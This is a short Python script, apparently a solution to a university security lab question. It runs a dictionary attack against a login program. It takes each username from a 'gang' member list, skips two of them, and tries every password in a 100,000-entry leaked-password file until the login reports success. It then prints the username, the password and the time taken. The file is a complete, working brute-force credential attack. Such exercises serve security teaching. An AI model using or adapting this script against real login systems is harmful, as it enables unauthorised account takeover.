import subprocess
from time import time
import sys

start = time()

login = "/home/cse/Lab1/Q3/Login.pyc"

with open("/home/cse/Lab1/Q3/PwnedPWs100k", "r") as f:
    passwords = f.read().splitlines()

with open("/home/cse/Lab1/Q3/gang", "r") as f:
    members = f.read().splitlines()

for person in members:
    if (person != "SkyRedFalcon914" and person != "ForestGreenWolf607"):
        for line in passwords:
            line = line.strip()
            answer = subprocess.run(["python3", login, person, line], text= True, capture_output = True)
            if ("Login successful.\n" == answer.stdout):
                print(person)
                print(line)
                print(time() - start)
                sys.exit(0)
print(time() - start)
sys.exit(1)
